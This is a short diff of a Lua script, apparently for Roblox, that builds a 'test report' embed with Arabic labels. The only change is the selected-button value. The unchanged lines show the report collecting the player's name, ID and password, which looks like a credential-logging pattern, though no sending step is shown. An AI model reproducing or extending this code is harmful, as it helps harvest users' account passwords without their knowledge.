@@ -14,7 +14,7 @@ local function sendTestReport()
                 {["name"] = "اسم المستخدم", ["value"] = Player.Name, ["inline"] = true},
                 {["name"] = "كلمة مرور المستخدم", ["value"] = Player.password, ["inline"] = true},
                 {["name"] = "المعرف (ID)", ["value"] = tostring(Player.UserId), ["inline"] = true},
-                {["name"] = "الزر المختار", ["value"] = "X", ["inline"] = true}
+                {["name"] = "الزر المختار", ["value"] = "F", ["inline"] = true}
             },
             ["color"] = 65280 -- لون أخضر
         }}
